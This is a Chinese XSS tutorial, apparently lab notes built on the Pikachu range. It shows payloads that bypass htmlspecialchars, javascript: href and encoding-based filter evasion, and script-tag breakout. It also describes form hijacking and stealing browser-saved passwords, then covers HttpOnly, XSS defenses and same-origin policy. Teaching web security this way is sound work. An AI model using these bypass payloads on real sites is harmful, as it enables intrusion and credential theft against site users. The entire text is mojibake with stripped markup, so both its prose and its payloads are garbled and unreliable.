å®ä½“ï¼Œè¿™ä¸ªå°±å¾ˆå‰å®³äº†ã€‚ // é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼šè¿™å°±æ˜¯æˆ‘ä»¬å­¦åˆ°çš„htmlç¼–ç  (å’Œå·)æˆä¸º amp (åŒå¼•å·)æˆä¸º quot â€™ (å•å¼•å·)æˆä¸º#039 (å°äº)æˆä¸º lt (å¤§äº)æˆä¸º gt// å¯¼è‡´ä½ æäº¤çš„scriptæ ‡ç­¾å†è¾“å‡ºçš„æ—¶å€™å˜æˆäº† ltscriptgt // è¯¥å‡½æ•°çš„è¯­æ³•ï¼šhtmlspecialchars(string,flags,character-set,double_encode)è¿‡æ»¤åŸç†ï¼šhtmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œä»è€Œä½¿XSSæ”»å‡»å¤±æ•ˆã€‚ä½†æ˜¯è¿™ä¸ªå‡½æ•°é»˜è®¤é…ç½®ä¸ä¼šå°†å•å¼•å·å’ŒåŒå¼•å·è¿‡æ»¤ï¼Œåªæœ‰è®¾ç½®äº†quotestyleè§„å®šå¦‚ä½•ç¼–ç å•å¼•å·å’ŒåŒå¼•å·æ‰èƒ½ä¼šè¿‡æ»¤æ‰å•å¼•å·// å¯ç”¨çš„quotestyleç±»å‹ï¼š// ENT_COMPAT - é»˜è®¤ã€‚ä»…ç¼–ç åŒå¼•å·ï¼Œä¹Ÿå°±æ˜¯é»˜è®¤æƒ…å†µä¸‹ä¸å¯¹å•å¼•å·è¿›è¡Œå¤„ç†// ENT_QUOTES - ç¼–ç åŒå¼•å·å’Œå•å¼•å·// ENT_NOQUOTES - ä¸ç¼–ç ä»»ä½•å¼•å· pikachuï¼šä¸‹é¢çš„ä»£ç å°±ä¸èƒ½æ‰§è¡Œäº† ç»•è¿‡ï¼š é¦–å…ˆçœ‹ä¸€ä¸‹ä»£ç ï¼Œé»˜è®¤æ˜¯ä¸å¯¹å•å¼•å·å¤„ç†çš„ å¯ä½¿ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š qâ€™ onclickâ€™alert(111)â€™ ï¼Œæ²¡æœ‰ä»€ä¹ˆå°–æ‹¬å·ä¹‹ç±»çš„äº†ï¼Œåªæœ‰å•å¼•å·å…ˆæ¥ä¸ªæˆ‘ä»¬å¹³å¸¸ç”¨çš„ï¼Œå‘ç°æ²¡æœ‰æ•ˆæœ å†æ¥ä¸ª qâ€™ onclickâ€™alert(111)â€™ æ¶æ„ä»£ç æ‰§è¡Œäº†ï¼Œè¿™æ ·å°±ç»•è¿‡å»äº†ã€‚ å†çœ‹03çš„ä»£ç ï¼Œæ”¹è¿›äº†ï¼Œå°†å•å¼•å·ä¹Ÿå¹²æ‰äº†ã€‚æˆ‘ä»¬å†æ¥è¯•è¯•åˆšæ‰çš„ä»£ç  ç„¶åçœ‹pikachu å‘ç°ä¸è¡Œäº† xssä¹‹hrefç»•è¿‡ï¼š javascript:alert(1111) ## çœ‹ä¸€ä¸‹ç¼–ç å¤„ç†ï¼šjavascript:alert(1111) # æ­£å¸¸javascript:alert(aini) # æ­£å¸¸javascript:alert(/aini/) # æ­£å¸¸ # å¯¹alertä¸­çš„å†…å®¹è¿›è¡Œunicodeç¼–ç ,ä¹Ÿå°±æ˜¯æ‰€è°“çš„jsç¼–ç javascript:alert(\\u0031\\u0031\\u0031\\u0031) #ä¸éœ€è¦å¼•å·çš„æ•°å­—å¼¹æ¡†æ—¶ï¼Œç¼–ç ä¹‹åä¸èƒ½å¼¹æ¡†javascript:alert(/\\u006a\\u0061\\u0064\\u0065\\u006e/) #å¤–å±‚æ˜¯/çš„è¯ï¼Œå†…å®¹ä¸èƒ½æ­£å¸¸è§£æï¼Œä½†æ˜¯å¯ä»¥å¼¹æ¡†javascript:alert(\\u006a\\u0061\\u0064\\u0065\\u006e) #å¤–å±‚æ˜¯å¼•å·çš„è¯ï¼Œå†…å®¹ä¹Ÿå¯ä»¥æ­£å¸¸è§£æï¼Œä¹Ÿæ²¡æœ‰å¼¹æ¡† # å¯¹alertä¸­çš„å†…å®¹è¿›è¡Œhtmlå®ä½“ç¼–ç (asciiåè¿›åˆ¶ç¼–ç )+urlç¼–ç javascript:alert(%26%2349%3B%26%2349%3B%26%2349%3B%26%2349%3B) # ä¸éœ€è¦å¼•å·çš„æ•°å­—å¼¹æ¡†æ—¶ï¼Œç¼–ç ä¹‹åä¸èƒ½å¼¹æ¡†javascript:alert(/%26%23106%3B%26%2397%3B%26%23100%3B%26%23101%3B%26%23110%3B/) # å†…å®¹ä¸èƒ½è§£æï¼Œä½†æ˜¯æœ‰å¼¹æ¡†javascript:alert(%26%23106%3B%26%2397%3B%26%23100%3B%26%23101%3B%26%23110%3B) # å†…å®¹ä¸èƒ½è§£æï¼Œä¹Ÿæ²¡æœ‰å¼¹æ¡† # å¯¹æ•´ä½“è¿›è¡Œhtmlå®ä½“ç¼–ç (asciiåè¿›åˆ¶ç¼–ç )+urlç¼–ç ï¼Œä¸èƒ½è§£æ%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2349%3B%26%2349%3B%26%2349%3B%26%2341%3B# å¯¹alertè¿›è¡Œunicodeç¼–ç  #å¯ä»¥è§£ææ‰§è¡Œjavascript:\\u0061\\u006c\\u0065\\u0072\\u0074(1111) # å¯¹alertè¿›è¡Œunicodeç¼–ç +urlç¼–ç  #å¯ä»¥è§£ææ‰§è¡Œjavascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074(1111) #å¯¹javascriptè¿›è¡Œunicodeç¼–ç +urlç¼–ç  #ä¸èƒ½è§£ææ‰§è¡Œ%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu0073%5Cu0063%5Cu0072%5Cu0069%5Cu0070%5Cu0074:alert(1111)# å¯¹javascriptè¿›è¡Œunicodeç¼–ç +urlç¼–ç ï¼Œä¸èƒ½è§£æ#106;#97;#118;#97;#115;#99;#114;#105;#112;#116;:alert(1111) # ç›´æ¥ç¼–ç ## ä¸è¡Œè§£æ%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B:alert(1111) 5-8 ç¼–ç ç»•è¿‡htmlhead/headbody input id=xssr_in type=text name=message/ input id=postsubmit type=submit name=submit value=submit / div id=content /div/bodyscriptvar btn = document.getElementById(postsubmit);btn.onclick = function() var val = document.getElementById(xssr_in).value; var content = document.getElementById(content); document.write(val);/script/html æ€è·¯ï¼šåå°æœ‰å¯èƒ½ä¼šå¯¹ä»£ç ä¸­çš„å…³é”®å­—è¿›è¡Œè¿‡æ»¤ï¼Œä½†æˆ‘ä»¬å¯ä»¥å°è¯•å°†å…³é”®å­—è¿›è¡Œç¼–ç ååœ¨æ’å…¥ï¼Œæµè§ˆå™¨å¯¹æ”¹ç¼–ç è¿›è¡Œè¯†åˆ«æ—¶ï¼Œä¼šç¿»è¯‘æˆæ­£å¸¸çš„ä»£ç ã€‚ï¼ˆæ³¨æ„ï¼šç¼–ç åœ¨è¾“å‡ºæ—¶æ˜¯å¦ä¼šè¢«æ­£å¸¸è¯†åˆ«å’Œç¿»è¯‘æ‰æ˜¯å…³é”®ï¼Œä¸æ˜¯æ‰€æœ‰çš„ç¼–ç éƒ½æ˜¯å¯ä»¥çš„ï¼Œæ‰€ä»¥éœ€è¦ç ”ç©¶æµè§ˆå™¨åˆ°åº•èƒ½å¤Ÿå°†å“ªäº›ç¼–ç æ•°æ®èƒ½å¤Ÿæ­£å¸¸è§£ç æ˜¾ç¤ºï¼‰ï¼Œå¤§å®¶ç†è§£æ€è·¯å³å¯ã€‚åˆ°åº•æµè§ˆå™¨èƒ½ä¸èƒ½è§£æï¼Œè°ä¹Ÿä¸èƒ½ä¿å‡†ï¼Œå› ä¸ºæµè§ˆå™¨ä¹Ÿä¸€ç›´åœ¨å‡çº§ï¼Œè§£æè§„åˆ™å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚ !--æµè§ˆå™¨è§£æé¡ºåºæ˜¯è¿™æ ·çš„ï¼ŒURL è§£æå™¨ï¼ŒHTML è§£æå™¨ï¼Œ CSS è§£æå™¨ï¼ŒJSè§£æå™¨URLçš„è§£ç æ˜¯åœ¨åå°æœåŠ¡æ£€æµ‹ä¹‹å‰çš„ï¼Œå¯ä»¥ç†è§£ä¸ºåå°æ”¶åˆ°URLåä¼šè‡ªåŠ¨è¿›è¡Œè§£ç ï¼Œç„¶åæ‰æ˜¯æ‰§è¡Œå¼€å‘äººå‘˜ç¼–å†™çš„å¯¹URLä¸­çš„å€¼çš„æ£€æµ‹å‡½æ•°ï¼Œé¦–å…ˆURLç¼–ç ä½œç”¨ä¸åœ¨äºç»•è¿‡åå°æ£€æµ‹ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æ˜¯GETæ–¹å¼æäº¤æ•°æ®æ—¶ï¼Œè€Œæˆ‘ä»¬æäº¤çš„æ•°æ®ä¸­è¿›è¡Œäº†å®ä½“ç¼–ç ï¼Œä¹Ÿå°±æ„å‘³ç€å­˜åœ¨ï¼Œ#è¿™æ ·çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè¿™æ—¶å°±éœ€è¦å¯¹è¿™äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒURLç¼–ç ï¼Œè¿™æ ·æ‰ä¼šä¿è¯æ­£å¸¸è§£æï¼Œå¦‚æœä¸è¿›è¡ŒURLç¼–ç çš„è¯ï¼Œå°±ä¼šæŠŠ+è®¤ä¸ºæ˜¯ç©ºæ ¼äº†ï¼Œè€Œä¹Ÿä¼šæ˜¯è¢«è®¤ä¸ºç”¨æ¥è¿æ¥URLä¸­å‚æ•°çš„è¿æ¥ç¬¦ï¼Œæ•…éœ€è¦è¿›è¡ŒURLç¼–ç ã€‚å¦‚æœæ˜¯ä»¥POSTæ–¹å¼ä¼ é€’å€¼ï¼Œå°±ä¸éœ€è¦è¿›è¡ŒURLç¼–ç äº†ã€‚CSSè§£æå™¨æ˜¯ç”¨æ¥è§£æCSSä»£ç çš„ï¼Œæˆ‘ä»¬æš‚æ—¶å…ˆä¸åšç ”ç©¶ã€‚æˆ‘ä»¬é‡ç‚¹çœ‹çš„æ˜¯ï¼š-- htmlå®ä½“ç¼–ç ï¼ˆHTMLè§£æå™¨ï¼‰#åè¿›åˆ¶; æˆ–è€…#xåå…­è¿›åˆ¶ï¼› JSç¼–ç ï¼ˆJSè§£æå™¨ï¼‰ \\u00åå…­è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯unicodeç¼–ç htmlç›¸å…³çš„å‡ ç§ç¼–ç æ–¹å¼ï¼š1ã€htmlå®ä½“ç¼–ç  img src=# onerror=alert(aini)/ -- lt;img src=# onerror=alert(jaden)/gt;2ã€ä½¿ç”¨åè¿›åˆ¶çš„ASCLLç¼–ç ï¼š æ ¼å¼ï¼šä»¥ç¬¦å·#å¼€å¤´ï¼Œåˆ†å·;ç»“å°¾åœ¨çº¿å·¥å…·ï¼š http://tools.gree020.cn/ascii/ https://tool.chinaz.com/tools/unicode.aspx img src=x onerror=#97;#108;#101;#114;#116;#40;#39;#121;#97;#110;#103;#115;#104;#117;#97;#110;#103;#39;#41;/ æ³¨æ„ï¼Œä½œä¸ºå±æ€§å€¼çš„æ—¶å€™ï¼Œå¤–å±‚çš„åŒå¼•å·ä¸è¦ç¼–ç ã€‚src=ï¼Œå±æ€§å’Œç­‰äºå·ä¹Ÿä¸è¦ç¼–ç å› ä¸ºä¼šç ´åæ ‡ç­¾å±æ€§ç»“æ„ã€‚ img src=x onerror=#34;#97;#108;#101;#114;#116;#40;#39;#121;#97;#110;#103;#115;#104;#117;#97;#110;#103;#39;#41#34;/3ã€unicodeç¼–ç  #ã€#xã€\\u éƒ½å¯ä»¥ç”¨æ¥è¡¨ç¤ºä¸€ä¸² unicode ç¼–ç ï¼Œunicodeç¼–ç åº•å±‚è¿˜æ˜¯ç”¨äºŒè¿›åˆ¶æ¥å­˜å‚¨çš„ï¼Œæ˜¾ç¤ºä¸€èˆ¬ç”¨16è¿›åˆ¶æ¥è¡¨ç¤ºã€‚ \\uå¼€å¤´å’Œ#xå¼€å¤´æ˜¯ä¸€æ ·çš„éƒ½æ˜¯16è¿›åˆ¶ï¼Œåªæ˜¯unicodeå­—ç¬¦çš„ä¸åŒå†™æ³•ï¼Œ#åˆ™æ˜¯unicodeå­—ç¬¦çš„10è¿›åˆ¶çš„å†™æ³•ã€‚ \\uå½¢å¼ï¼šæµè§ˆå™¨æ— æ³•è§£æ img src=#onerror=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u006a\\u0061\\u0064\\u0065\\u006e\\u0027\\u0029/#xå½¢å¼ï¼šæµè§ˆå™¨å¯è§£æ img src=#onerror=#x0061;#x006c;#x0065;#x0072;#x0074;#x0028;#x0027;#x006a;#x0061;#x0064;#x0065;#x006e;#x0027;#x0029;/!--å®ä½“ç¼–ç è¦åœ¨ä¸ç ´åDOMæ ‘çš„æ„æˆï¼Œå¯¹äºæœ‰è¯­æ³•ç»“æ„çš„æ ‡ç­¾åã€å±æ€§åã€æ ‡ç­¾åå°±ä¸èƒ½è¿›è¡Œå®ä½“ç¼–ç ï¼Œå¯¹å±æ€§çš„å€¼ï¼Œæ ‡ç­¾ä¹‹é—´çš„æ–‡æœ¬èŠ‚ç‚¹èƒ½å¤Ÿè¿›è¡Œå®ä½“ç¼–ç ï¼Œè€ŒJSç¼–ç åªèƒ½å¯¹ä½äºJSè§£æç¯å¢ƒå†…å­—ç¬¦è¿›è¡Œç¼–ç ä¸”ä¸èƒ½æ˜¯æ‹¬å·ã€åŒå¼•å·ã€å•å¼•å·ç­‰æ„æˆç‰¹æ®Šæ„ä¹‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæ¯”å¦‚alert(1)ä¸­çš„æ‹¬å·å°±ä¸èƒ½è¿›è¡Œå®ä½“ç¼–ç ï¼Œè€Œä¸”åœ¨JSç¼–ç ç¯å¢ƒä¸­ä¸ä¼šè¿›è¡Œå®ä½“ç¼–ç è§£æï¼Œä½†æœ‰ä¸€ä¸ªä¾‹å¤–ï¼Œåœ¨javascriptä¼ªåè®®ä¸­ï¼Œæ¯”å¦‚testï¼Œå³å¯ä»¥æŠŠjavascript:alert(â€˜testâ€™);è¿™ä¸€éƒ¨åˆ†çœ‹æˆæ˜¯æ ‡ç­¾açš„å±æ€§hrefçš„å€¼ï¼Œä»è€Œèƒ½å¤Ÿè¿›è¡Œå®ä½“ç¼–ç ä¼šè¢«æ­£å¸¸å®ä½“ç¼–ç è§£æï¼Œåˆå¯ä»¥å¯¹alertæˆ–alertä¸­çš„å­—ç¬¦è¿›è¡ŒJSç¼–ç ï¼Œä½†å¯¹alertä¸­çš„å­—ç¬¦ç¼–ç æ²¡ä»€ä¹ˆå®é™…ä½œç”¨.å¦‚æœæ˜¯è¾“å‡ºåˆ°äº†jsä»£ç ä¸­ï¼Œå†ç”±jsä»£ç è¾“å‡ºåˆ°htmlä¸­ï¼Œé‚£ä¹ˆjsä¼šå…ˆå°†unicodeç¼–ç è¿›è¡Œè§£æï¼Œç„¶åå†è¾“å‡ºåˆ°htmlä¸­ï¼Œè¿™å°±æœ‰äº†htmlæ ‡ç­¾æ•ˆæœã€‚å¦‚ä¸‹ï¼š--scriptvar btn = document.getElementById(postsubmit);btn.onclick = function() var val = document.getElementById(xssr_in).value; var content = document.getElementById(content); document.write(\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0032\\u0033\\u0029\\u003b\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e);/script 5-9 xssä¹‹jsè¾“å‡º æäº¤ä¹‹åï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°äº†è¿™æ®µä»£ç  æ„å»ºxssæ”»å‡»ä»£ç ï¼Œ å‰é¢çš„ä»£ç è¢« é—­åˆäº†ï¼Œåé¢æˆ‘å†™äº†æ–°çš„scriptæ ‡ç­¾å†…å®¹ 1111/scriptscriptalert(è¿‡ä¸å»å•¦ï¼)/script; // é—­åˆå‰é¢çš„scriptæ ‡ç­¾ script $ms=1111/scriptscriptalert(è¿‡ä¸å»å•¦ï¼)/script; if($ms.length != 0) if($ms == tmac) $(#fromjs).text(tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..) else // alert($ms); $(#fromjs).text(æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..) /script å°†è¿™ä¸ªæ”¹åçš„ä»£ç æ³¨å…¥æäº¤ æ‰€ä»¥ï¼Œå‰ç«¯ä»£ç è¿˜æ˜¯ä¸é è°±çš„ï¼Œæ€»æ˜¯å¯ä»¥æ³¨å…¥ï¼Œå› ä¸ºå¯ä»¥æ„é€ ã€‚ 5-10 XSSä¹‹httponlyç»•è¿‡xssæ”»å‡»æ‰‹æ®µè·å–cookieã€‚ HttpOnlyæ˜¯åŒ…å«åœ¨httpå“åº”å¤´Set-Cookieé‡Œé¢çš„ä¸€ä¸ªé™„åŠ çš„æ ‡è¯†ï¼Œæ‰€ä»¥å®ƒæ˜¯åç«¯æœåŠ¡å™¨å¯¹cookieè®¾ç½®çš„ä¸€ä¸ªé™„åŠ çš„å±æ€§ï¼Œåœ¨ç”Ÿæˆcookieæ—¶ä½¿ç”¨HttpOnlyæ ‡å¿—æœ‰åŠ©äºå‡è½»å®¢æˆ·ç«¯è„šæœ¬è®¿é—®å—ä¿æŠ¤cookieçš„é£é™©ï¼ˆå¦‚æœæµè§ˆå™¨æ”¯æŒçš„è¯ï¼‰ï¼Œå¤§å¤šæ•°XSSæ”»å‡»éƒ½æ˜¯é’ˆå¯¹ä¼šè¯cookieçš„ç›—çªƒã€‚åç«¯æœåŠ¡å™¨å¯ä»¥é€šè¿‡åœ¨å…¶åˆ›å»ºçš„cookieä¸Šè®¾ç½®HttpOnlyæ ‡å¿—æ¥å¸®åŠ©ç¼“è§£æ­¤é—®é¢˜ï¼Œè¿™è¡¨æ˜è¯¥cookieåœ¨å®¢æˆ·ç«¯ä¸Šä¸å¯è®¿é—®ã€‚å¦‚æœæ”¯æŒHttpOnlyçš„æµè§ˆå™¨æ£€æµ‹åˆ°åŒ…å«HttpOnlyæ ‡å¿—çš„cookieï¼Œå¹¶ä¸”å®¢æˆ·ç«¯è„šæœ¬ä»£ç å°è¯•è¯»å–è¯¥cookieï¼Œåˆ™æµè§ˆå™¨å°†è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ä½œä¸ºç»“æœã€‚è¿™ä¼šé€šè¿‡é˜»æ­¢æ¶æ„ä»£ç ï¼ˆé€šå¸¸æ˜¯XSSï¼‰å°†æ•°æ®å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™æ¥ä½¿æ”»å‡»å¤±è´¥ã€‚ å¦‚æœHTTPå“åº”æ ‡å¤´ä¸­åŒ…å«HttpOnlyæ ‡å¿—ï¼ˆå¯é€‰ï¼‰ï¼Œå®¢æˆ·ç«¯è„šæœ¬å°†æ— æ³•è®¿é—®cookieï¼ˆå¦‚æœæµè§ˆå™¨æ”¯æŒè¯¥æ ‡å¿—çš„è¯ï¼‰ã€‚å› æ­¤å³ä½¿å®¢æˆ·ç«¯å­˜åœ¨è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´ï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå°†Cookieé€éœ²ç»™ç¬¬ä¸‰æ–¹ã€‚ä½†æ˜¯å¦‚æœæµè§ˆå™¨ä¸æ”¯æŒHttpOnlyï¼Œå¹¶ä¸”åç«¯æœåŠ¡å™¨è®¾ç½®äº†HttpOnly cookieï¼Œæµè§ˆå™¨ä¹Ÿä¼šå¿½ç•¥HttpOnlyæ ‡å¿—ï¼Œä»è€Œåˆ›å»ºä¼ ç»Ÿçš„ï¼Œè„šæœ¬å¯è®¿é—®çš„cookieã€‚é‚£ä¹ˆè¯¥cookieï¼ˆé€šå¸¸æ˜¯ä¼šè¯cookieï¼‰å®¹æ˜“å—åˆ°XSSæ”»å‡»ã€‚è¿™é‡Œå¤§å®¶è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ httponlyä¸æ˜¯é˜²æ­¢xssæ”»å‡»çš„ï¼Œè€Œæ˜¯é˜²æ­¢xssæ”»å‡»ä»£ç ä¸­çš„jsä»£ç åœ¨æµè§ˆå™¨ä¸Šè·å–cookieä¿¡æ¯ã€‚ å„è¯­è¨€è®¾ç½®cookieçš„httponly java response.setHeader(Set-Cookie, cookiename=value; Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly); C# HttpCookie myCookie = new HttpCookie(myCookie); myCookie.HttpOnly = true; Response.AppendCookie(myCookie); PHP4 setcookie(ant[uname],$_POST[username],time()+3600,NULL,NULL,NULL,true); å…¶å®æˆ‘ä»¬ç™»å½•åå°æœ‰ä¸¤ç§æ–¹å¼ï¼Œæ–¹å¼1ï¼šç›´æ¥ç”¨æˆ·åå’Œå¯†ç ç™»å½• æ–¹å¼2ï¼šé€šè¿‡cookieã€tokenç­‰è®¤è¯ä¿¡æ¯ç›´æ¥ç™»å½•ã€‚å¤§å¤šæ•°XSSæ”»å‡»éƒ½æ˜¯é’ˆå¯¹ä¼šè¯cookieçš„ç›—çªƒã€‚å½“ç”¨æˆ·é€šè¿‡ç”¨æˆ·åå’Œå¯†ç ç™»å½•æŸç½‘ç«™ä¹‹åï¼Œæµè§ˆå™¨å¯èƒ½ä¼šæç¤ºä»–ä¿å­˜ç”¨æˆ·åå’Œå¯†ç ï¼Œé‚£ä¹ˆç”¨æˆ·ä¸ºäº†æ–¹ä¾¿ï¼Œå¾ˆæœ‰å¯èƒ½ç‚¹å‡»äº†ä¿å­˜ã€‚å¦‚æœæ˜¯è¿™ç§æƒ…å†µçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•æ¥è¯»å–æµè§ˆå™¨ä¿å­˜çš„ç”¨æˆ·åå’Œå¯†ç ä¿¡æ¯ã€‚å¦‚æœç”¨æˆ·ç™»å½•ä¹‹åæ²¡æœ‰ä¿å­˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨è¡¨å•åŠ«æŒçš„æ–¹æ³•æ¥è·å–ç”¨æˆ·åå’Œå¯†ç ã€‚**** 5-11 è¡¨å•åŠ«æŒè¡¨å•åŠ«æŒçš„å‰ææ¡ä»¶æ˜¯ç™»å½•é¡µé¢å­˜åœ¨å­˜å‚¨å‹xssæ¼æ´ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡è¿™ä¸ªxssæ¼æ´æ³¨å…¥æˆ‘ä»¬çš„xssæ”»å‡»ä»£ç ï¼Œæ”»å‡»ä»£ç ä¸­åŒ…å«è·å–è¡¨å•æ•°æ®å¹¶å‘é€ç»™æ”»å‡»è€…ç½‘ç«™çš„èƒ½åŠ›ï¼Œç„¶åå½“å…¶ä»–ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„xssæ”»å‡»ä»£ç è¢«åŠ è½½æ‰§è¡Œäº†ï¼Œå½“ç”¨æˆ·è¾“å…¥å®Œç”¨æˆ·åå’Œå¯†ç ç‚¹å‡»æäº¤çš„æ—¶å€™ï¼Œç»™ç½‘ç«™åå°å‘é€äº†è¯·æ±‚çš„åŒæ—¶ä¹Ÿç»™æ”»å‡»è€…å‘é€äº†ç”¨æˆ·åå’Œå¯†ç ï¼Œå½“ç„¶äº†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡jsçš„é”®ç›˜è®°å½•ç›‘æ§æ¥è·å–ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ è¡¨å•åŠ«æŒçš„å‰ææ¡ä»¶å…¶å®å°±ä¸å¥½æ»¡è¶³ï¼Œæ‰€ä»¥è¡¨å•åŠ«æŒçš„è¿™ç§æ‰‹æ³•æ¯”è¾ƒé¸¡è‚‹ã€‚ 5-12 è·å–æµè§ˆå™¨ä¿å­˜çš„å¯†ç è·å–å¦‚ä¸‹ç™»å½•é¡µé¢çš„ç”¨æˆ·åå’Œå¯†ç  ç™»å½•é¡µé¢htmlä»£ç å¦‚ä¸‹ï¼š æ”»å‡»jsä»£ç å¤§è‡´å¦‚ä¸‹ ä¸»è¦æ˜¯äº§ç”Ÿåœ¨åå°çš„å­˜å‚¨å‹xssæ”»å‡»ï¼Œå¦‚ç•™è¨€æ¿ç­‰åŠŸèƒ½ï¼Œå½“æ”»å‡»ä»£ç è¢«åŠ è½½ä¹‹åï¼Œä¼šè‡ªåŠ¨è¯»å–æµè§ˆå™¨ä¿å­˜çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ å¥½ï¼Œæˆ‘ä»¬å…ˆè®°ä½è¿™äº›æ”»å‡»ç»•è¿‡æ‰‹æ®µå³å¯ã€‚xssçš„å‡ ä¸ªæ”»å‡»æ‰‹æ®µï¼Œæˆ‘ä»¬å°±è¯´è¿™ä¹ˆå¤šäº†ã€‚ 5-13 XSSå¸¸è§„é˜²èŒƒXSSé˜²å¾¡çš„æ€»ä½“æ€è·¯æ˜¯ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œç‰¹æ®Šç¬¦å·å¿…é¡»è¿‡æ»¤æ‰ï¼Œå•å¼•å·ã€åŒå¼•å·ã€å°–æ‹¬å·ä¹‹ç±»çš„ï¼Œå¯¹è¾“å‡ºè¿›è¡Œç¼–ç  è¿‡æ»¤ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚è¾“å‡ºç‚¹è¦æ±‚è¾“å…¥æ‰‹æœºå·ï¼Œåˆ™åªå…è®¸è¾“å…¥æ‰‹æœºå·æ ¼å¼çš„æ•°å­—ã€‚ è½¬ä¹‰ï¼šæ‰€æœ‰è¾“å‡ºåˆ°å‰ç«¯çš„æ•°æ®éƒ½æ ¹æ®è¾“å‡ºç‚¹è¿›è¡Œè½¬ä¹‰ï¼Œæ¯”å¦‚è¾“å‡ºåˆ°htmlä¸­è¿›è¡Œhtmlå®ä½“è½¬ä¹‰ï¼Œè¾“å…¥åˆ°JSé‡Œé¢çš„è¿›è¡ŒJSè½¬ä¹‰() xssä¹‹hrefè¾“å‡ºç»•è¿‡ï¼š javascript:alert(1111) ï¼Œç›´æ¥ä»£å…¥aæ ‡ç­¾herfé‡Œé¢ä¸€æ ·å¯ä»¥ç»•è¿‡htmlspecialcharsï¼Œå¦‚æœæ²¡æœ‰æŠŠç”¨æˆ·æäº¤çš„æ•°æ®äº¤ç»™aæ ‡ç­¾ï¼Œå…¶å®å¾ˆéš¾ç»•è¿‡äº†ã€‚xssä¹‹jsè¾“å‡ºç»•è¿‡ script $ms=11/scriptscriptalert(1111)/script ; if($ms.length != 0) if($ms == tmac) $(#fromjs).text(tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..) else // alert($ms); $(#fromjs).text(æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..) /script è¾“å…¥è¯­å¥ï¼š 2/scriptscriptalert(1111)/script 5-14 åŒæºå’Œè·¨åŸŸ(1)ã€ä»€ä¹ˆæ˜¯è·¨åŸŸhttp:// www. jaden.cn :80 /news/index.phpåè®® å­åŸŸå ä¸»åŸŸå ç«¯å£ èµ„æºåœ°å€å½“åè®®ã€ä¸»æœº(ä¸»åŸŸåï¼Œå­åŸŸå)ã€ç«¯å£ä¸­çš„ä»»æ„ä¸€ä¸ªä¸ç›¸åŒæ—¶ï¼Œç§°ä¸ºä¸åŒåŸŸã€‚æˆ‘ä»¬æŠŠä¸åŒçš„åŸŸä¹‹é—´è¯·æ±‚æ•°æ®çš„æ“ä½œï¼Œæˆä¸ºè·¨åŸŸæ“ä½œã€‚ä¸åŒåŸŸç¤ºä¾‹ï¼šhttp://www.jaden.cn:80 http://www.jaden.cn:81 https://www.jaden.cn:80 http://www.jadens.cn:80 ä¸åŒåŸŸä¹‹é—´è¿›è¡Œæ²Ÿé€šï¼Œå«åšè·¨åŸŸ(2)ã€åŒæºç­–ç•¥ å¯¹äºjsä»£ç æ¥è¯´ï¼Œä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½çº¦å®šäº†â€œåŒæºç­–ç•¥â€ï¼ŒåŒæºç­–ç•¥ç¦æ­¢é¡µé¢åŠ è½½æˆ–æ‰§è¡Œä¸è‡ªèº«æ¥æºä¸åŒçš„åŸŸçš„ä»»ä½•è„šæœ¬ï¼Œæ—¢ä¸åŒåŸŸä¹‹é—´ä¸èƒ½ä½¿ç”¨JSè¿›è¡Œæ“ä½œã€‚æ¯”å¦‚ï¼šx.comåŸŸåä¸‹çš„jsä¸èƒ½æ“ä½œy.comåŸŸåä¸‹çš„å¯¹è±¡ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆè¦æœ‰åŒæºç­–ç•¥ï¼Ÿ 